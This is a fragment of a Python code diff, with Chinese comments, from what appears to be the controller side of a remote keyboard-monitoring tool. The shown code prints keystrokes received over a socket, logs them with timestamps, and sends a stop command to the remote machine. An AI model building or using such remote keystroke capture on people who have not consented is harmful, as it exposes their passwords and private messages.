+                                    print(f"{Colors.GREEN}[{timestamp[-8:]}] {key_display}{Colors.RESET}")
+                        
+                        except socket.timeout:
+                            continue
+                
+                except KeyboardInterrupt:
+                    print(f"\n{Colors.YELLOW}停止监控...{Colors.RESET}")
+                
+                finally:
+                    # 恢复原始超时
+                    self.client_socket.settimeout(CONNECTION_TIMEOUT)
+                    
+                    # 发送停止监控请求
+                    msg = create_keyboard_monitor_stop_message()
+                    send_message(self.client_socket, msg)
+                    
+                    # 写入结束时间
+                    log_file.write(f"\n{'='*50}\n")
+                    log_file.write(f"结束时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                    log_file.write(f"=== 监控结束 ===\n")
+            
+            print(f"\n{Colors.GREEN}✓ 键盘监控已停止{Colors.RESET}")
+            print(f"  日志已保存: {log_filepath}")
+        
+        except Exception as e:
+            print(f"{Colors.RED}✗ 键盘监控失败: {e}{Colors.RESET}")
+            import traceback
+            traceback.print_exc()
 
 
 def main():
